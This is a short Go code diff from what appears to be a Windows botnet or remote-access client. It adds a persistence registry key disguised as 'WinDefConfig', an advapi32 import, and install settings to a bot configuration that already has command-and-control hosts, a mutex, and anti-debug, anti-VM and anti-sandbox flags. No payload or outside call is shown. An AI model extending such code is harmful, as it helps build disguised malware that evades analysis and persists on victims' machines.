@@ -47,10 +47,15 @@ var (
 	}
 	seed = rand.New(rand.NewSource(time.Now().UTC().UnixNano()))
 
+	guid    = ""
+	token   = ""
+	regpath = "Software/WinDefConfig"
+
 	// Dlls loading
 	user32   = syscall.NewLazyDLL("user32.dll")
 	kernel32 = syscall.NewLazyDLL("kernel32.dll")
 	psapi    = syscall.NewLazyDLL("psapi.dll")
+	advapi32 = syscall.NewLazyDLL("advapi32.dll")
 
 	// win32 api
 	pfnCreateMutexW       = kernel32.NewProc("CreateMutexW")
@@ -64,14 +69,17 @@ var (
 	pfnGetLastError       = kernel32.NewProc("GetLastError")
 
 	botcore = BotCore{
-		hosts:        []string{"http://127.0.0.1:9521/"},
+		hosts:        []string{"127.0.0.1:8080"},
 		singleton:    true,
 		anti_debug:   false,
 		anti_vm:      false,
 		anti_sandbox: false,
+		install:      false,
 		use_ssl:      false,
 		delay:        0,
 		mutex_name:   "heelo",
+		install_file: "",
+		install_path: "",
 	}
 )
 
@@ -85,9 +93,12 @@ type BotCore struct {
 	anti_debug   bool
 	anti_vm      bool
 	anti_sandbox bool
+	install      bool
 	use_ssl      bool
 	delay        uint
 	mutex_name   string
+	install_file string
+	install_path string
 }
 
 type Win32_Process struct {
